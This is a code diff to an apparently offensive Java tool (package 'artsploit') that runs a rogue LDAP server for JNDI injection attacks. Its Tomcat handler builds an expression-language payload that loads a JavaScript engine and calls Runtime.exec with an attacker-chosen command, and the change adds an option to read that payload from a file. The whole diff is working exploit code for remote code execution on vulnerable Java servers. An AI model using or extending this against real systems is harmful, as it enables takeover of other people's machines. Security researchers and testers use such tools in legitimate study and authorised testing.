@@ -10,6 +10,9 @@ import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 
+import java.nio.file.Files;
+import java.nio.file.Path;
+
 import static artsploit.Utilities.makeJavaScriptString;
 import static artsploit.Utilities.serialize;
 
@@ -30,15 +33,22 @@ import static artsploit.Utilities.serialize;
  */
 @LdapMapping(uri = { "/o=tomcat" })
 public class Tomcat implements LdapController {
-
-    String payload = ("{" +
-            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
-            ".newInstance().getEngineByName(\"JavaScript\")" +
-            ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
-            "}")
-            .replace("${command}", makeJavaScriptString(Config.command));
-
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
+        String jsPayload;
+
+        if (Config.jsPayloadPath.isEmpty()) {
+            jsPayload = Config.command;
+        } else {
+            jsPayload = Files.readString(Path.of(Config.jsPayloadPath));
+        }
+
+        String payload = ("{" +
+                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
+                ".newInstance().getEngineByName(\"JavaScript\")" +
+                ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")" +
+                "}")
+                .replace("${command}", makeJavaScriptString(jsPayload));
+
 
         System.out.println("Sending LDAP ResourceRef result for " + base + " with javax.el.ELProcessor payload");
 
